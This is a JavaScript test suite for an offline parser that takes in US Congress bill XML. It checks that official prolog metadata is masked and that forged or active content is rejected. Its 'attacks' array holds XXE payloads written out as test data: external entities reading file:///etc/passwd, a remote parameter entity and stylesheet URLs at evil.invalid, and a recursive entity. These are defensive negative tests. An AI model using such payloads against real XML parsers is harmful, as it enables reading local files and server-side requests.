import test from 'node:test';
import assert from 'node:assert/strict';
import {createHash} from 'node:crypto';
import {readFileSync,mkdtempSync,writeFileSync,rmSync} from 'node:fs';
import {tmpdir} from 'node:os';
import {join} from 'node:path';
import {prepareOfflineXml,OfflineXmlPrologError} from '../packages/content/xml/prolog.mjs';
import {scanQuarantinedBytes,IntakeError} from '../packages/content/intake/index.mjs';
import {parseLegislativeXml} from '../packages/content/xml/index.mjs';
import {pack,docxMime} from './fixtures/createDocx.mjs';

const declaration='<?xml version="1.0"?>';
const stylesheet='<?xml-stylesheet type="text/xsl" href="billres.xsl"?>';
const doctype='<!DOCTYPE bill PUBLIC "-//US Congress//DTDs/bill.dtd//EN" "bill.dtd">';
const prolog=declaration+'\n'+stylesheet+'\n'+doctype+'\n';
const body='<bill><section id="s1"><num>1.</num><header>A proposed rule</header><text>Keep “quoted” words, &amp; symbols 😃.</text></section></bill>';
const prepare=source=>prepareOfflineXml(source,{allowCongressMetadata:true});
const parse=source=>parseLegislativeXml(Buffer.from(source),{versionId:'test-congress-prolog'});
const sha=source=>createHash('sha256').update(source).digest('hex');

test('verified metadata is masked without changing text, UTF-16 offsets, line breaks or original source hashes',()=>{
  for(const source of [prolog+body,'\ufeff'+prolog.replace(/\n/g,'\r\n')+body,
    declaration+doctype+stylesheet+body]){
    const original=Buffer.from(source),copy=Buffer.from(original),prepared=prepare(source);
    assert.equal(prepared.xml.length,source.length);
    assert.equal(prepared.xml.slice(source.indexOf('<bill>')),body);
    assert.deepEqual(prepared.xml.match(/[\r\n]/g),source.match(/[\r\n]/g));
    assert.equal(prepared.xml.includes('<!DOCTYPE'),false);
    assert.equal(prepared.xml.includes('<?xml-stylesheet'),false);
    const scan=scanQuarantinedBytes(original,'application/xml');
    const parsed=parseLegislativeXml(original,{versionId:'test-congress-prolog'});
    assert.equal(scan.sha256,sha(original));assert.equal(parsed.xmlSha256,sha(original));
    assert.deepEqual(original,copy);
    assert.equal(parsed.provisions[0].xmlOffset,source.indexOf('<section'));
    assert.equal(parsed.provisions[0].text,'1.A proposed ruleKeep “quoted” words, & symbols 😃.');
    assert.ok(parsed.warnings.includes('known_bill_dtd_ignored_offline'));
    assert.ok(parsed.warnings.includes('known_bill_stylesheet_ignored_offline'));
  }
});

test('a forged upload with the same headers receives no official-source or publication authority',()=>{
  const source=Buffer.from(prolog+body.replace('A proposed rule','A completely invented private draft'));
  const scan=scanQuarantinedBytes(source,'text/xml');
  const parsed=parseLegislativeXml(source,{versionId:'private-draft'});
  assert.equal(scan.disposition,'quarantined');assert.equal(scan.publishable,false);
  assert.equal(parsed.sourceComplete,false);assert.equal(parsed.publicationAllowed,false);
  for(const value of [scan,parsed]){
    assert.equal(Object.hasOwn(value,'isOfficialMetadata'),false);
    assert.equal(Object.hasOwn(value,'officialSource'),false);
    assert.equal(Object.hasOwn(value,'sourceUrl'),false);
  }
});

test('modified, incomplete, duplicated or misplaced known metadata is rejected at both intake and parsing',()=>{
  const attacks=[
    stylesheet+doctype+body,
    declaration+stylesheet+body,
    declaration+doctype+body,
    declaration+stylesheet+doctype+stylesheet+body,
    declaration+doctype+doctype+stylesheet+body,
    prolog.replace('bill.dtd','https://evil.invalid/bill.dtd')+body,
    prolog.replace('bill.dtd','file:///etc/passwd')+body,
    prolog.replace('"bill.dtd"','"../bill.dtd"')+body,
    prolog.replace('"bill.dtd"','"&#x62;ill.dtd"')+body,
    prolog.replace('href="billres.xsl"','href="https://evil.invalid/style.xsl"')+body,
    prolog.replace('href="billres.xsl"','href="//evil.invalid/style.xsl"')+body,
    prolog.replace('href="billres.xsl"','href="billres.xsl?remote=1"')+body,
    prolog.replace('type="text/xsl" href="billres.xsl"','href="billres.xsl" type="text/xsl"')+body,
    prolog.replace('PUBLIC','SYSTEM')+body,
    prolog.replace('-//US Congress//DTDs/bill.dtd//EN','-//Unverified//DTDs/bill.dtd//EN')+body,
    prolog.replace('<!DOCTYPE','<!doctype')+body,
    prolog.replace(declaration,'<?xml version="1.0" encoding="UTF-8"?>')+body,
    prolog+'<law><section><text>Wrong root</text></section></law>',
    prolog+'<ns:bill xmlns:ns="urn:other"><section/></ns:bill>',
    '<bill>'+stylesheet+doctype+'<section/></bill>',
    declaration+'<!-- prefix -->'+stylesheet+doctype+body,
    prolog+'<?unknown instruction?>'+body,
    prolog+body.replace('<text>','<text><?unknown instruction?>'),
    prolog.replace('"bill.dtd">','"bill.dtd" []>')+body,
    prolog.replace('"bill.dtd">','"bill.dtd" [<!ENTITY stolen SYSTEM "file:///etc/passwd">]>')+body,
    prolog.replace('"bill.dtd">','"bill.dtd" [<!ENTITY % remote SYSTEM "https://evil.invalid/parameter"> %remote;]>')+body,
    prolog.replace('"bill.dtd">','"bill.dtd" [<!ENTITY a "recursive &a;">]>')+body,
    declaration+'\n'.repeat(1025)+stylesheet+doctype+body
  ];
  for(const source of attacks){
    assert.throws(()=>scanQuarantinedBytes(Buffer.from(source),'application/xml'),
      error=>error instanceof IntakeError&&error.code==='ACTIVE_XML');
    assert.throws(()=>parse(source));
  }
});

test('unknown processing instructions, declarations, encodings and entity definitions remain prohibited without Congress metadata',()=>{
  for(const source of ['<?other value?>'+body,'<?xml version="1.1"?>'+body,
    '<?xml version="1.0" encoding="UTF-16"?>'+body,
    '<?xml version="1.0" unknown="attribute"?>'+body,
    declaration+declaration+body,'<!NOTATION unknown SYSTEM "file:///private">'+body,
    '<!ENTITY unknown "value">'+body,'<![CDATA[unexpected]]>'+body]){
    assert.throws(()=>prepare(source),OfflineXmlPrologError);
    assert.throws(()=>scanQuarantinedBytes(Buffer.from(source),'application/xml'),IntakeError);
    assert.throws(()=>parse(source));
  }
  // Ordinary UTF-8 declarations still work, but gain no DTD/stylesheet allowance.
  const ordinary='<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'+body;
  assert.equal(parse(ordinary).provisions.length,1);
  assert.deepEqual(prepare(ordinary).warnings,[]);
});

test('literal bill.dtd and billres.xsl metadata is never loaded and cannot introduce named entities',()=>{
  const directory=mkdtempSync(join(tmpdir(),'ask-bill-xml-inert-'));
  const previous=process.cwd(),previousFetch=globalThis.fetch;let fetchCalls=0;
  try{
    writeFileSync(join(directory,'bill.dtd'),'<!ENTITY injected "PRIVATE_CANARY_FROM_LOCAL_FILE">');
    writeFileSync(join(directory,'billres.xsl'),'PRIVATE_CANARY_FROM_LOCAL_STYLESHEET');
    process.chdir(directory);
    globalThis.fetch=()=>{fetchCalls++;throw new Error('External XML resolution is forbidden')};
    const parsed=parse(prolog+body);
    assert.equal(JSON.stringify(parsed).includes('PRIVATE_CANARY'),false);
    assert.throws(()=>parse(prolog+body.replace('words','&injected;')),
      error=>error.code==='XML_ENTITY');
    assert.equal(fetchCalls,0);
  }finally{
    process.chdir(previous);globalThis.fetch=previousFetch;rmSync(directory,{recursive:true,force:true});
  }
});

test('entity validation rejects unknown names of every length and partially numeric or invalid character references',()=>{
  for(const entity of ['&unknown;','&thisUnknownEntityNameIsDeliberatelyLongerThanThirtyCharacters;',
    '&unterminated','&#65junk;','&#x41junk;','&#-1;','&#0;','&#11;','&#xD800;','&#xFFFF;','&#x110000;']){
    assert.throws(()=>parse(prolog+body.replace('words',entity)),error=>error.code==='XML_ENTITY');
  }
  const valid=parse(prolog+body.replace('words','&#65; &#x1F603; &apos; &quot; &lt; &#9;'));
  assert.ok(valid.provisions[0].text.includes('A 😃 \' " < \t'));
});

test('Congress prolog exceptions do not apply to DOCX and active PDF content remains blocked',()=>{
  assert.throws(()=>prepareOfflineXml(prolog+body),OfflineXmlPrologError);
  assert.throws(()=>scanQuarantinedBytes(pack(prolog+body),docxMime),
    error=>error instanceof IntakeError&&error.code==='ACTIVE_XML');
  for(const action of ['EmbeddedFile','OpenAction','JavaScript']){
    assert.throws(()=>scanQuarantinedBytes(Buffer.from('%PDF-1.7\n/'+action+' << >>\n%%EOF'),'application/pdf'),
      error=>error instanceof IntakeError&&error.code==='ACTIVE_PDF');
  }
});

test('pinned complete public Congressional XML parses offline with its exact downloaded digest',()=>{
  const bytes=readFileSync(new URL('./fixtures/congress/BILLS-119hr123ih.xml',import.meta.url));
  const provenance=JSON.parse(readFileSync(new URL('./fixtures/congress/BILLS-119hr123ih.provenance.json',import.meta.url),'utf8'));
  assert.equal(bytes.length,16073);assert.equal(bytes.length,provenance.bytes);
  assert.equal(sha(bytes),'6e28624dac5abaf462edd60e3c090291afa9280596b5dd93369f7297a54a2caf');
  assert.equal(sha(bytes),provenance.sha256);
  const scanned=scanQuarantinedBytes(bytes,'application/xml');
  const parsed=parseLegislativeXml(bytes,{versionId:'119-hr123-ih-pinned-public-fixture'});
  assert.equal(scanned.sha256,provenance.sha256);assert.equal(parsed.xmlSha256,provenance.sha256);
  assert.equal(parsed.provisions.length,45);
  assert.ok(parsed.provisions.some(item=>item.text.includes('Improving Science in Chemical Assessments Act')));
  assert.ok(parsed.provisions.some(item=>item.text.includes('dose-response modeling, using non-linear approaches')));
  for(const provision of parsed.provisions){
    assert.ok(bytes.toString('utf8').slice(provision.xmlOffset).startsWith('<'));
    assert.equal(provision.hash,sha(provision.text));
  }
  assert.equal(parsed.sourceComplete,false);assert.equal(parsed.publicationAllowed,false);
});
